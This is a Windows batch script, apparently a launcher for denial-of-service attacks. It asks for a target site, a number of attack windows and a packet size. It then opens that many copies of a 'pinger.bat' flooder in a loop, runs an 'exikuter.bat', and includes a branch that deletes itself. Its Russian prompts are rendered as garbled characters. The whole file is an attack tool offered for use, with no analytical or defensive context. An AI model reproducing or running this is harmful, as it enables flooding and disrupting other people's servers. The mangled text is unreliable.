cd %~dp0
color 2
set y=y
set c=0
set g=0
set s=0
CLS 
@echo off 
echo �ਢ�� � ⮡�� �������� DOS �⠪�.
 >nul timeout /t 3 /nobreak
CLS 
goto :a
:a
CLS 
echo ������ ᠩ� �� ����� ��筥��� DOS �����:
set /p "ping="
if %ping% == %s% goto dell
CLS 
echo ������ ᪮�쪮 ��������� DOS �⠪ �ਬ�� - 100:
set /p "pi= " "
CLS 
echo ������ ������⢮ ���� � �����:
set /p "bait= " "
CLS 
echo �������������� ������ ���������� %pi% CMD ���� ��� ���������� ����� ENTER:
 >nul timeout /t 3 /nobreak

set COUNTER=0
goto loop

:loop
if %COUNTER%==%pi% goto end
set /A COUNTER=COUNTER+1
echo %COUNTER%
start pinger.bat
 >nul timeout /t 0.3 /nobreak
goto loop

:end
start exikuter.bat
pause
exit   

:end2
pause
exit   

:dell
del DOS.bat
goto end2